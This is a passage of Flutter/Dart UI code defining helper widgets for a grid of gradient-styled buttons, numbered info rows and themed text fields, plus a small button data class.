  // ─────────────────────────────────────────────────────────────────────────
  // GRID BUTTON HELPER
  // ─────────────────────────────────────────────────────────────────────────
  Widget _buildGridButtons(List<_GridButton> buttons, {int columns = 2}) {
    final List<Widget> rows = [];
    for (int i = 0; i < buttons.length; i += columns) {
      final rowButtons = buttons.skip(i).take(columns).toList();
      rows.add(
        Padding(
          padding: const EdgeInsets.only(bottom: 12),
          child: Row(
            children: [
              for (int j = 0; j < rowButtons.length; j++)
                Expanded(
                  child: Padding(
                    padding: EdgeInsets.only(right: j < rowButtons.length - 1 ? 12 : 0),
                    child: _gridButton(rowButtons[j]),
                  ),
                ),
              for (int j = rowButtons.length; j < columns; j++)
                Expanded(child: SizedBox()),
            ],
          ),
        ),
      );
    }
    return Column(children: rows);
  }

  Widget _gridButton(_GridButton btn) {
    return InkWell(
      onTap: btn.onTap,
      borderRadius: BorderRadius.circular(16),
      child: Container(
        height: 100,
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              ControlTheme.surface2,
              ControlTheme.surface,
            ],
          ),
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: btn.color.withOpacity(0.3),
            width: 0.5,
          ),
          boxShadow: ControlShadowUtils.soft,
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 48,
              height: 48,
              decoration: BoxDecoration(
                color: btn.color.withOpacity(0.15),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: btn.color.withOpacity(0.2),
                  width: 0.5,
                ),
              ),
              child: Icon(btn.icon, color: btn.color, size: 24),
            ),
            SizedBox(height: 10),
            Text(
              btn.label,
              style: TextStyle(
                fontSize: 11,
                fontWeight: FontWeight.w600,
                color: ControlTheme.textPrimary,
                letterSpacing: 0.5,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // UI HELPERS
  // ─────────────────────────────────────────────────────────────────────────
  Widget _infoRow(String num, String text) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(
      children: [
        Container(
          width: 22,
          height: 22,
          decoration: BoxDecoration(
            color: ControlTheme.silver.withOpacity(0.1),
            borderRadius: BorderRadius.circular(6),
            border: Border.all(
              color: ControlTheme.silver.withOpacity(0.2),
            ),
          ),
          child: Center(
            child: Text(
              num,
              style: TextStyle(
                fontSize: 9,
                fontWeight: FontWeight.bold,
                color: ControlTheme.silver,
              ),
            ),
          ),
        ),
        SizedBox(width: 12),
        Expanded(
          child: Text(
            text,
            style: TextStyle(
              color: ControlTheme.textMuted,
              fontSize: 10,
            ),
          ),
        ),
      ],
    ),
  );

  Widget _field(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) =>
    TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: TextStyle(
        color: ControlTheme.textPrimary,
        fontSize: 13,
      ),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(
          color: ControlTheme.textMuted,
          fontSize: 11,
        ),
        hintStyle: TextStyle(
          color: ControlTheme.textMuted,
          fontSize: 11,
        ),
        filled: true,
        fillColor: ControlTheme.cardDark,
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(
            color: ControlTheme.silver.withOpacity(0.1),
          ),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(
            color: ControlTheme.silver.withOpacity(0.1),
          ),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(12),
          borderSide: BorderSide(
            color: ControlTheme.silver.withOpacity(0.3),
          ),
        ),
      ),
    );
}

// ─────────────────────────────────────────────────────────────────────────────
// COLOR PICKER SHEET
// ─────────────────────────────────────────────────────────────────────────────
class _GridButton {
  final String label;
  final Color color;
  final IconData icon;
  final VoidCallback onTap;
  
  _GridButton(this.label, this.color, this.icon, this.onTap);
}